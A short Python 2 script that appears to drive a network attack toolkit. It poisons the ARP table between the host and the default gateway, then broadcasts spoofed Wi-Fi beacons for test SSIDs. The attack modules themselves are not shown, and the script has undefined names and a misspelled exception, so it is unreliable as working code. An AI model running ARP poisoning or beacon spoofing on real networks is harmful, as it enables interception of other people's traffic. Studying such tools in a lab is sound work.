import gen_utils as gu
from arp import Arp_poison
from beacon import Beacon
import time

gu.root_check()

def main():
    try:
        arp_attack = Arp_poison(gu.get_pub_ip(), gu.get_default_gateway())
    except invalidIface:
        print "The interface is invalid! (switch it to monitor mode)"
        sys.exit(1)

    try:
        mybeacon = Beacon() # enter a monitor iface here
    except invalidIface:
        print "The interface is invalid! (switch it to monitor mode)"
        sys.exit(1)

    mybeacon.send(ssid="TEST", enc = True)
    mybeacon.send(ssid="TEST1", enc = False)
    mybeacon.send(ssid="TEST2", enc = True)
    mybeacon.send(ssid="TEST3")
    mybeacon.list()
    mybeacon.stop()
    mybeacon.list()
    time.sleep(5)
    mybeacon.stop_all()
    arp_attack.poison_arp_table()
    time.sleep(10)
    arp_attack.restore_arp_table()

try:
    main()
except KeyboadInterrupt:
    print("Exitting")
